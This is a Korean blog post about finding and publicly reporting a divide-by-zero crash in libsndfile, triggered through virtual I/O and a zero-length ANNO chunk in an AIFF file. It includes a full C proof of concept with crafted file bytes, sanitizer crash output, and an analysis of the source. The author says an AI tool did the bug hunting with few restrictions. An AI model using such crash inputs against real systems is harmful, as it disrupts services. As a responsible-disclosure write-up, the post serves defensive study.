---
title: libsndfile 버그 제보 후기
date: 2026-11-06
categories: [Bug Bounty]
tags: [fuzzing, bugbounty, libsndfile]
---

# libsndfile 버그 제보 후기


# 시작한 계기

보안 공부를 그동안 하면서, 워게임/CTF만 했지 버그바운티 쪽은 전혀 해보지 않았다. 그러다가 CTF/워게임 자체를 건드는 빈도도 슬슬 떨어져 갈 때 slop 수준이라 하더라도, AI로 뭐라도 한번 해보자! 하고 생각한 것이 오픈소스 퍼징이였다.

## 대상 선정 이유

libsndfile은, 오디오 데이터를 처리하기 위해서 사용되는 오픈소스 C언어 라이브러리다.
내가 이 라이브러리는 퍼징 대상으로 삼은 건 사실 큰 이유가 없다. 그냥 GPT에 오픈소스 중 보고 방법이 있으면서 퍼징 대상으로 할만한 오픈소스를 추천해달라고 한 뒤 내가 고른 것이 libsndfile이였다.

# 퍼징 과정

## 1. 버그 찾기

사실…. 진짜 별거 없었다. 정말 이게 맞나? 라는 생각이 들 정도였다.

원래 퍼징을 한다면, 소스코드에서 퍼징을 할 부분을 찾고, 퍼저를 돌려가며 커버리지를 높이는 방향이겠지만. 나는 그냥 daybreak blue가지고 말 그대로 “해줘” 했다. 지금은 daybreak blue가 검열이 좀 강해진 것 같지만, 내가 할 때는 정말 엔간해선 해줬다. 

특히 기억에 남았던 부분을 꼽으라고 하면, 처음에 1차로 무한 로딩 버그를 찾은 직후 github issue를 보고 이미 올라가 있는 이슈라 판단하고 다른 버그를 찾는 부분으로 넘어갔었다는 부분이다.
물론 hakerone이나 메일 마냥 비공개 제보가 아니었기 때문에 가능한 부분이었겠지만 요즘 버그바운티쪽에서 duplicate가 많이 발생하는 점, 그리도 만약 여기서 끊고 바로 결과를 내놨다면 나는 중복 여부 확인 없이 바로 검증에 들어갔을 것이라 생각하니 상당히 중요한 부분이었다.

그리고 그 후 찾은 부분이 `sf_open_virtual()` 에서 0으로 나누는 오류가 발생하는 부분을 찾아내었다.

## 2. PoC 분석

PoC 코드까지 확인한 뒤 UBSan+ASan을 통하여서 검증을 시도했다.

```c
//poc.c
#include <sndfile.h>
#include <stdio.h>
#include <string.h>

typedef struct
{	const unsigned char *data ; sf_count_t size, pos ;
} MEM ;

static sf_count_t length (void *p) { return ((MEM *) p)->size ; }
static sf_count_t tell (void *p) { return ((MEM *) p)->pos ; }

static sf_count_t
seek (sf_count_t offset, int whence, void *p)
{	MEM *m = p ;
	sf_count_t next = whence == SEEK_SET ? offset
		: whence == SEEK_CUR ? m->pos + offset : m->size + offset ;
	return next < 0 || next > m->size ? -1 : (m->pos = next) ;
}

static sf_count_t
read_data (void *out, sf_count_t count, void *p)
{	MEM *m = p ;
	if (count > m->size - m->pos)
		count = m->size - m->pos ;
	memcpy (out, m->data + m->pos, count) ;
	m->pos += count ;
	return count ;
}

int
main (void)
{	static const unsigned char aiff [] =
	{	"FORM\0\0\0\066AIFFCOMM\0\0\0\022\0\001\0\0\0\0\0\030"
		"\100\016\254\104\0\0\0\0\0\0ANNO\0\0\0\0SSND\0\0\0\010\0\0\0\0\0\0\0\0"
		} ;
	MEM mem = { aiff, sizeof (aiff) - 1, 0 } ;
	SF_VIRTUAL_IO vio = { length, seek, read_data, NULL, tell } ;
	SF_INFO info = { 0 } ;
	SF_CHUNK_INFO chunk = { "ANNO", 4, 0, NULL } ;
	unsigned char byte ;
	int error ;
	SNDFILE *sndfile = sf_open_virtual (&vio, SFM_READ, &info, &mem) ;
	SF_CHUNK_ITERATOR *it = sndfile ? sf_get_chunk_iterator (sndfile, &chunk) : NULL ;

	if (!it || sf_get_chunk_size (it, &chunk) != SF_ERR_NO_ERROR || chunk.datalen != 0)
		return 1 ;
	fprintf (stderr, "ANNO datalen=%u\n", chunk.datalen) ;
	chunk.data = &byte ;
	error = sf_get_chunk_data (it, &chunk) ;
	sf_close (sndfile) ;
	return error ;
}
```

PoC 구조를 설명하면 다음과 같다.

### 구조체

```c
typedef struct
{	const unsigned char *data ; sf_count_t size, pos ;
} MEM ;
```

`sf_open_virtual()` 에서는 AIFF 파일을 직접 읽지 않고, 위와 같은 구조체로 데이터의 메모리 주소, 길이, 위치를 전달받아 사용한다.

`length`는 가상 파일 전체 길이, `tell`은 현재 읽기 위치, `seek`는 읽기 위치 이동을 위한 함수. `read_data`는 가상 파일을 실제로 읽고 반환한다.

### main

```c
static const unsigned char aiff [] =
	{	"FORM\0\0\0\066AIFFCOMM\0\0\0\022\0\001\0\0\0\0\0\030"
		"\100\016\254\104\0\0\0\0\0\0ANNO\0\0\0\0SSND\0\0\0\010\0\0\0\0\0\0\0\0"
		} ;
```

이 배열은 AIFF 파일 전체를 bytearray로 표현한 것이고, 해석하자면 다음과 같다.

- `FORM 00 00 00 36 AIFF`
    - AIFF 파일은 `FORM + [크기] + AIFF` 로 시작한다.
- `COMM\0\0\0\022\0\001\0\0\0\0\0\030\100\016\254\104\0\0\0\0\0\0`
    - 채널 수 1, 프레임 수 0, 샘플 크기 24비트, 샘플레이트 44,100Hz을 의미한다.
- `ANNO\0\0\0\0`
    - 주석 메타데이터 부분, `ANNO` 뒤 4바이트는 데이터 길이를 나타내며 이 경우 0이다.
    - **이 `ANNO`의 길이가 0일 때 0으로 나누는 경우가 발생하며 나머지 부분은 파일 형식을 위한 부분이다.**
- `SSND\0\0\0\010\0\0\0\0\0\0\0\0`
    - 원래 실제 오디오 데이터가 들어가는 부분

```c
MEM mem = { aiff, sizeof (aiff) - 1, 0 } ;
SF_VIRTUAL_IO vio = { length, seek, read_data, NULL, tell } ;
SF_INFO info = { 0 } ;
SF_CHUNK_INFO chunk = { "ANNO", 4, 0, NULL } ;
```

aiff를 `MEM` 형식으로 만들고, 가상 파일로 하기 위해 앞서 만든 `length, seek, read_data, tell` 로 가상 I/O 설정.

`chunk`는 `ANNO`의 위치를 찾기 위해 선언.

```c
unsigned char byte ;
int error ;
SNDFILE *sndfile = sf_open_virtual (&vio, SFM_READ, &info, &mem) ;
SF_CHUNK_ITERATOR *it = sndfile ? sf_get_chunk_iterator (sndfile, &chunk) : NULL ;

if (!it || sf_get_chunk_size (it, &chunk) != SF_ERR_NO_ERROR || chunk.datalen != 0)
	return 1 ;
fprintf (stderr, "ANNO datalen=%u\n", chunk.datalen) ;
chunk.data = &byte ;
error = sf_get_chunk_data (it, &chunk) ;
sf_close (sndfile) ;
return error ;
```

`sf_open_virtual`로 실제 AIFF 파일을 연다. 그 후 `sf_get_chunk_iterator` 로 `ANNO` 청크를 찾는다.

그 후 `sf_get_chunk_size (it, &chunk)` 에서 청크의 길이를 조회한다.  
PoC의 경우 길이가 0이니 `chunck.datalen`은 0이고 이후 `sf_get_chunk_data`로 `ANNO` 청크의 데이터를 읽는다. 이 부분에서 crash가 발생한다.

```bash
ANNO datalen=0
src/file_io.c:349:63: runtime error: division by zero
    #0 0x628c3ca816f2 in psf_fread src/file_io.c
    #1 0x628c3c9a0b5d in aiff_get_chunk_data src/aiff.c:1853:2
    #2 0x628c3c95cb53 in main poc.c:49:10
    ...

SUMMARY: UndefinedBehaviorSanitizer: undefined-behavior src/file_io.c:349:63
AddressSanitizer:DEADLYSIGNAL
=================================================================
==56092==ERROR: AddressSanitizer: FPE on unknown address 0x628c3ca814c2 (pc 0x628c3ca814c2 bp 0x7ffdbd78fb80 sp 0x7ffdbd78fb10 T0)
    #0 0x628c3ca814c2 in psf_fread src/file_io.c
    #1 0x628c3c9a0b5d in aiff_get_chunk_data src/aiff.c:1853:2
    #2 0x628c3c95cb53 in main poc.c:49:10
    ...

SUMMARY: AddressSanitizer: FPE src/file_io.c in psf_fread
==56092==ABORTING
```

ASan/UBsan으로 테스트한 결과다.

우선 poc에서는 `sf_get_chucnk_data`를 호출했는데 왜 `aiff_get_chunk_data`가 호출되었는지부터 보자.

`aiff.c:235` 를 보면 다음과 같은 부분이 있다.

```c
if (psf->file.mode == SFM_READ || ...)
{
    if ((error = aiff_read_header(psf, &comm_fmt)))
        return error;

    psf->next_chunk_iterator = aiff_next_chunk_iterator;
    psf->get_chunk_size = aiff_get_chunk_size;
    psf->get_chunk_data = aiff_get_chunk_data;
    ...
}
```

만약 파일이 AIFF인 경우, `psf->get_chunk_data` 를 `aiff_get_chunk_data`로 설정한다.

그리고 `sf_get_chunk_data`는

```c
int
sf_get_chunk_data (const SF_CHUNK_ITERATOR * iterator, SF_CHUNK_INFO * chunk_info)
{	SF_PRIVATE	*psf ;
	SNDFILE	*sndfile = iterator ? iterator->sndfile : NULL ;

	VALIDATE_SNDFILE_AND_ASSIGN_PSF (sndfile, psf, 1) ;

	if (chunk_info == NULL || chunk_info->data == NULL)
		return SFE_BAD_CHUNK_PTR ;

	if (psf->get_chunk_data)
		return psf->get_chunk_data (psf, iterator, chunk_info) ;

	return SFE_BAD_CHUNK_FORMAT ;
} /* sf_get_chunk_data */
```

사실 직접 읽는 것이 아니라 `psf->get_chunk_data`를 호출하기 때문에 결과적으로 `aiff_get_chunk_data`를 읽는 것이다.

그 후 `src/aiff.c:1853:2` 에서는 `psf_fread`를 호출한다.

```c
psf_fread (chunk_info->data, SF_MIN (chunk_info->datalen, psf->rchunks.chunks [indx].len), 1, psf) ;
```

`psf_fread`는 다음과 같이 시작하는데 여기서 문제가 있다.

```c
psf_fread (void *ptr, sf_count_t bytes, sf_count_t items, SF_PRIVATE *psf)
{	sf_count_t total = 0 ;
	ssize_t count ;
	DWORD dwNumberOfBytesRead ;

	if (psf->virtual_io)
		return psf->vio.read (ptr, bytes*items, psf->vio_user_data) / bytes ;

	items *= bytes ;

	if (items <= 0)
		return 0 ;
	...
```

`psf->vio.read (ptr, bytes*items, psf->vio_user_data) / bytes` 를 수행하는데 bytes의 값이 0인지 확인을 하지 않고 바로 수행한다.

그렇기 때문에 이 부분에서 0으로 나누는 현상이 발생하고 crash가 나는 것이다.

# 버그 보고

사실 위에서 버그 찾는 과정은 LLM이 해주었고 나는 환각인지 진짜인지 검증하는 것 이외에는 한 것이 없었다.

그래서 사실상 시간을 버그를 찾는 것보다 보고를 어떻게 할 지 고민하는 데 더 많이 소모했다.

libsndfile은 버그 보고용 이메일과, github issue를 통한 제보를 둘 다 받고 있었다. 
그래서 처음에 이메일로 보내야 할지, 아니면 issue로 작성해야 할 지 고민을 상당히 하였는데, 똑같이 divides by zero에 대한 이슈가 과거에 있었고, 정수 오버플로나 버퍼 오버플로 등 더 심한 이슈들도 공개적으로 올라와 있어 issue로 작성하기로 하였다. 추가로 이 버그가 가상 I/O+AIFF라는 상당히 제한된 상황에서 발생한다는 점도 있었다.

그리고 보고 형식은 과거 이슈들에서 다른 제보자가 작성한 내용을 참고하여 작성했다. 사실 ai에게 이 부분도 맡기는 것도 가능하지만, 이 때가 버그바운티에서 ai slop 관련한 글을 한창 X에서 봤던 시기라서 조심스러웠던 점도 있었다.

전문은 따로 링크로 넣었다.

[https://github.com/libsndfile/libsndfile/issues/1173](https://github.com/libsndfile/libsndfile/issues/1173)

## 보고 그 후

작성일 기준 지난주(10/25)에 이 버그는 수정되었다. 
버그 보고가 처음이다 보니 이게 수정이 잘 될지, 어쩌면 내가 착각한 것은 아닌지 걱정도  되었지만 별 일 없이 처리되었다.

그리고 이 글을 쓰면서 이슈를 다시 보니, 비슷하게 `sf_current_byterate` 에서도 사실상 같은 식으로 0 확인을 안하고 나누는 문제가 있었다고 한다. 이 함수는 특정 파일만 적용되는 것도 아니라 내가 찾은 것보다 범위도 넓었다.

이런 걸 보면, 하나의 버그를 찾으면 그만이 아니라 비슷한 역할을 하는 다른 부분에 같은 문제가 있는지 살펴보는 것이 도움이 될 것 같다.

그리고 CVE는.. 솔직히 요즘 LLM으로 CVE가 우수수 나오는 마당에 이런 사소한 부분이 CVE가 될거라는 건 기대도 하고있지 않고 그냥 첫 버그 제보라는 부분에 의의를 두고 싶다.